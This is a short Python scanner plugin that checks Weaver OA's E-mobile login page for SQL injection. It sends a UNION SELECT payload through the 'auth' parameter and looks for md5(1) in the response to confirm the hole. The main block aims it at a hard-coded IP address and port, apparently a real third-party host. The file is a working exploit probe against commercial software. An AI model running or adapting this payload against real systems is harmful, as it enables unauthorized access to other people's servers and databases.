#!/usr/bin/python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2015-0105520

def assign(service, arg):
    if service == "weaver_oa":
        return True, arg

def audit(url):
    payload = '''{"auths":[{"value":"-1%27%20UNION%20SELECT%201,2,md5(1),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23"}]}'''
    url += 'E-mobile/Data/login_other.php?diff=sync&auth='
    url += payload

    code, head,res, errcode, _ = curl.curl2(url)

    if 'c4ca4238a0b923820dcc' in res:
        security_hole(url)
    if 'mysql_fetch_assoc' in res:
        security_warning(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://122.224.149.30:8082/')[1])